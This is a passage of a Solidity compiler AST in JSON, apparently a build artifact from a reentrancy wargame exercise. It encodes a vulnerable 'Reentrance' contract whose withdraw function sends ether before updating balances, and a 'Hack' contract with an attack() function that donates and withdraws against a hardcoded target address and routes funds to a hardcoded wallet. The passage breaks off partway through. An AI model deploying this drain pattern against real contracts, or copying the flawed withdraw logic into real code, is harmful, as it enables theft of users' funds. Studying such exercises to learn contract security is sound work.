															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 364,
															"src": "285:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 371,
														"indexExpression": {
															"argumentTypes": null,
															"id": 370,
															"name": "_to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 366,
															"src": "294:3:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "285:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 376,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "319:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 377,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "319:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 372,
																	"name": "balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 364,
																	"src": "301:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 374,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 373,
																	"name": "_to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 366,
																	"src": "310:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "301:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 375,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 181,
															"src": "301:17:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 378,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "301:28:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "285:44:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 380,
												"nodeType": "ExpressionStatement",
												"src": "285:44:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "00362a95",
									"id": 382,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "donate",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 367,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 366,
												"mutability": "mutable",
												"name": "_to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 382,
												"src": "246:11:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 365,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "246:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "245:13:1"
									},
									"returnParameters": {
										"id": 368,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "274:0:1"
									},
									"scope": 435,
									"src": "230:107:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 393,
										"nodeType": "Block",
										"src": "416:40:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 389,
														"name": "balances",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 364,
														"src": "434:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 391,
													"indexExpression": {
														"argumentTypes": null,
														"id": 390,
														"name": "_who",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 384,
														"src": "443:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "434:14:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 388,
												"id": 392,
												"nodeType": "Return",
												"src": "427:21:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "70a08231",
									"id": 394,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 385,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 384,
												"mutability": "mutable",
												"name": "_who",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 394,
												"src": "364:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 383,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "364:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "363:14:1"
									},
									"returnParameters": {
										"id": 388,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 387,
												"mutability": "mutable",
												"name": "balance",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 394,
												"src": "399:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 386,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "399:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "398:17:1"
									},
									"scope": 435,
									"src": "345:111:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 429,
										"nodeType": "Block",
										"src": "506:248:1",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 404,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 399,
															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 364,
															"src": "521:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 402,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 400,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "530:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 401,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "530:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "IndexAccess",
														"src": "521:20:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 403,
														"name": "_amount",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 396,
														"src": "545:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "521:31:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 428,
												"nodeType": "IfStatement",
												"src": "517:230:1",
												"trueBody": {
													"id": 427,
													"nodeType": "Block",
													"src": "554:193:1",
													"statements": [
														{
															"assignments": [
																406,
																null
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 406,
																	"mutability": "mutable",
																	"name": "result",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 427,
																	"src": "570:11:1",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"typeName": {
																		"id": 405,
																		"name": "bool",
																		"nodeType": "ElementaryTypeName",
																		"src": "570:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																},
																null
															],
															"id": 414,
															"initialValue": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "",
																		"id": 412,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "618:2:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																			"typeString": "literal_string \"\""
																		},
																		"value": ""
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																			"typeString": "literal_string \"\""
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																				"typeString": "literal_string \"\""
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 407,
																				"name": "msg",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": -15,
																				"src": "586:3:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_message",
																					"typeString": "msg"
																				}
																			},
																			"id": 408,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "sender",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "586:10:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		},
																		"id": 409,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "call",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "586:15:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																			"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																		}
																	},
																	"id": 411,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"names": [
																		"value"
																	],
																	"nodeType": "FunctionCallOptions",
																	"options": [
																		{
																			"argumentTypes": null,
																			"id": 410,
																			"name": "_amount",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 396,
																			"src": "609:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"src": "586:31:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
																		"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																	}
																},
																"id": 413,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "586:35:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "tuple(bool,bytes memory)"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "569:52:1"
														},
														{
															"condition": {
																"argumentTypes": null,
																"id": 415,
																"name": "result",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 406,
																"src": "640:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 419,
															"nodeType": "IfStatement",
															"src": "636:54:1",
															"trueBody": {
																"id": 418,
																"nodeType": "Block",
																"src": "648:42:1",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 416,
																			"name": "_amount",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 396,
																			"src": "667:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 417,
																		"nodeType": "ExpressionStatement",
																		"src": "667:7:1"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 425,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 420,
																		"name": "balances",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 364,
																		"src": "704:8:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 423,
																	"indexExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 421,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -15,
																			"src": "713:3:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 422,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "713:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "704:20:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "-=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 424,
																	"name": "_amount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 396,
																	"src": "728:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "704:31:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 426,
															"nodeType": "ExpressionStatement",
															"src": "704:31:1"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"functionSelector": "2e1a7d4d",
									"id": 430,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdraw",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 397,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 396,
												"mutability": "mutable",
												"name": "_amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 430,
												"src": "482:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 395,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "482:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "481:17:1"
									},
									"returnParameters": {
										"id": 398,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "506:0:1"
									},
									"scope": 435,
									"src": "464:290:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 433,
										"nodeType": "Block",
										"src": "789:2:1",
										"statements": []
									},
									"documentation": null,
									"id": 434,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 431,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "769:2:1"
									},
									"returnParameters": {
										"id": 432,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "789:0:1"
									},
									"scope": 435,
									"src": "762:29:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 577,
							"src": "116:678:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 576,
							"linearizedBaseContracts": [
								576
							],
							"name": "Hack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 441,
									"mutability": "mutable",
									"name": "target",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 576,
									"src": "819:76:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address_payable",
										"typeString": "address payable"
									},
									"typeName": {
										"id": 436,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "819:15:1",
										"stateMutability": "payable",
										"typeDescriptions": {
											"typeIdentifier": "t_address_payable",
											"typeString": "address payable"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"hexValue": "307861374236663443613144373561393837624331614332374332416441373845446642313634303834",
												"id": 439,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "number",
												"lValueRequested": false,
												"nodeType": "Literal",
												"src": "852:42:1",
												"subdenomination": null,
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"value": "0xa7B6f4Ca1D75a987bC1aC27C2AdA78EDfB164084"
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												}
											],
											"id": 438,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"lValueRequested": false,
											"nodeType": "ElementaryTypeNameExpression",
											"src": "844:8:1",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_address_payable_$",
												"typeString": "type(address payable)"
											},
											"typeName": {
												"id": 437,
												"name": "address",
												"nodeType": "ElementaryTypeName",
												"src": "844:8:1",
												"stateMutability": "payable",
												"typeDescriptions": {
													"typeIdentifier": null,
													"typeString": null
												}
											}
										},
										"id": 440,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "844:51:1",
										"tryCall": false,
										"typeDescriptions": {
											"typeIdentifier": "t_address_payable",
											"typeString": "address payable"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 446,
									"mutability": "mutable",
									"name": "re",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 576,
									"src": "902:34:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Reentrance_$435",
										"typeString": "contract Reentrance"
									},
									"typeName": {
										"contractScope": null,
										"id": 442,
										"name": "Reentrance",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 435,
										"src": "902:10:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Reentrance_$435",
											"typeString": "contract Reentrance"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"id": 444,
												"name": "target",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 441,
												"src": "929:6:1",
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												}
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												}
											],
											"id": 443,
											"name": "Reentrance",
											"nodeType": "Identifier",
											"overloadedDeclarations": [],
											"referencedDeclaration": 435,
											"src": "918:10:1",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_contract$_Reentrance_$435_$",
												"typeString": "type(contract Reentrance)"
											}
										},
										"id": 445,
										"isConstant": false,
										"isLValue": false,
										"isPure": false,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "918:18:1",
										"tryCall": false,
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Reentrance_$435",
											"typeString": "contract Reentrance"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 466,
										"nodeType": "Block",
										"src": "978:111:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 456,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -28,
																	"src": "1036:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Hack_$576",
																		"typeString": "contract Hack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Hack_$576",
																		"typeString": "contract Hack"
																	}
																],
																"id": 455,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1028:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 454,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1028:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 457,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1028:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 449,
																"name": "re",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 446,
																"src": "989:2:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Reentrance_$435",
																	"typeString": "contract Reentrance"
																}
															},
															"id": 451,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "donate",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 382,
															"src": "989:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_payable$_t_address_$returns$__$",
																"typeString": "function (address) payable external"
															}
														},
														"id": 453,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"argumentTypes": null,
																"hexValue": "31303030303030303030303030303030",
																"id": 452,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1006:20:1",
																"subdenomination": "wei",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000000_by_1",
																	"typeString": "int_const 1000000000000000"
																},
																"value": "1000000000000000"
															}
														],
														"src": "989:38:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_payable$_t_address_$returns$__$value",
															"typeString": "function (address) payable external"
														}
													},
													"id": 458,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "989:53:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 459,
												"nodeType": "ExpressionStatement",
												"src": "989:53:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "313030303030303030303030303030",
															"id": 463,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1065:15:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_100000000000000_by_1",
																"typeString": "int_const 100000000000000"
															},
															"value": "100000000000000"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_rational_100000000000000_by_1",
																"typeString": "int_const 100000000000000"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 460,
															"name": "re",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 446,
															"src": "1053:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Reentrance_$435",
																"typeString": "contract Reentrance"
															}
														},
														"id": 462,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "withdraw",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 430,
														"src": "1053:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256) external"
														}
													},
													"id": 464,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1053:28:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 465,
												"nodeType": "ExpressionStatement",
												"src": "1053:28:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "9e5faafc",
									"id": 467,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 447,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "960:2:1"
									},
									"returnParameters": {
										"id": 448,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "978:0:1"
									},
									"scope": 576,
									"src": "945:144:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 505,
										"nodeType": "Block",
										"src": "1130:262:1",
										"statements": [
											{
												"assignments": [
													471
												],
												"declarations": [
													{
														"constant": false,
														"id": 471,
														"mutability": "mutable",
														"name": "myWallet",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 505,
														"src": "1141:24:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 470,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "1141:15:1",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 473,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "307832373937463532393141374641413333363866463033313830376236423730433762424545463635",
													"id": 472,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "1168:42:1",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													},
													"value": "0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1141:69:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 481,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 477,
																			"name": "this",
